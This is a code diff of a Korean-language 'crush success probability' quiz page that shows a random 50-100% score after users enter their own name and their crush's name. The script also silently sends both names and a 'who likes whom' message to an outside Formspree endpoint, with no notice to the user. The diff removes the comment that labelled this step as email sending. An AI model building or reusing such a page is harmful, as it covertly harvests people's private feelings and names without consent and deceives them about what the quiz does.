@@ -2,46 +2,59 @@
 <html lang="ko">
 <head>
   <meta charset="UTF-8">
-  <title>짝사랑 확률 테스트</title>
+  <title>짝사랑 확률 테스트 💘</title>
   <style>
     body {
-      font-family: sans-serif;
+      font-family: 'Arial', sans-serif;
       text-align: center;
-      margin-top: 100px;
+      background-color: #fff0f5;
+      padding-top: 100px;
     }
     input, button {
-      padding: 10px;
-      margin: 10px;
+      padding: 12px;
+      margin: 8px;
       font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #ff69b4;
+      color: white;
+      cursor: pointer;
+    }
+    #result {
+      font-size: 20px;
+      margin-top: 30px;
     }
   </style>
 </head>
 <body>
-  <h1>짝사랑 성공 확률 테스트 💘</h1>
-  <p>당신과 그 사람의 이름을 입력하세요!</p>
-  <input type="text" id="yourName" placeholder="당신의 이름">
-  <br>
-  <input type="text" id="crushName" placeholder="짝사랑 이름">
-  <br>
-  <button onclick="submitForm()">확률 보기</button>
-  <p id="result" style="margin-top: 20px; font-size: 18px;"></p>
+  <h1>💘 짝사랑 성공 확률 테스트 💘</h1>
+  <p>두 사람의 이름을 입력하세요!</p>
+  <form id="loveForm">
+    <input type="text" id="yourName" name="yourName" placeholder="당신의 이름" required><br>
+    <input type="text" id="crushName" name="crushName" placeholder="짝사랑 상대 이름" required><br>
+    <button type="submit">확률 보기</button>
+  </form>
+  <div id="result"></div>
 
   <script>
-    function submitForm() {
-      const yourName = document.getElementById('yourName').value;
-      const crushName = document.getElementById('crushName').value;
-      const resultText = document.getElementById('result');
+    document.getElementById("loveForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const yourName = document.getElementById("yourName").value.trim();
+      const crushName = document.getElementById("crushName").value.trim();
+      const resultBox = document.getElementById("result");
 
       if (!yourName || !crushName) {
-        alert("이름을 모두 입력해주세요!");
+        resultBox.innerText = "⚠️ 이름을 모두 입력해주세요!";
         return;
       }
 
-      // 랜덤 확률 생성
       const percent = Math.floor(Math.random() * 51) + 50;
-      resultText.innerText = `😍 ${yourName}와(과) ${crushName}의 짝사랑 성공 확률은 ${percent}%입니다!`;
+      resultBox.innerText = `😍 ${yourName}와(과) ${crushName}의 짝사랑 성공 확률은 ${percent}%입니다!`;
 
-      // 이메일 발송
+  
       fetch("https://formspree.io/f/xanegwav", {
         method: "POST",
         headers: {
@@ -49,12 +62,12 @@
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          name: yourName,
-          crush: crushName,
-          message: `${yourName} -> ${crushName}`,
+          yourName: yourName,
+          crushName: crushName,
+          message: `${yourName}가 ${crushName}를 좋아해요! 성공 확률: ${percent}%`
         })
       });
-    }
+    });
   </script>
 </body>
 </html>
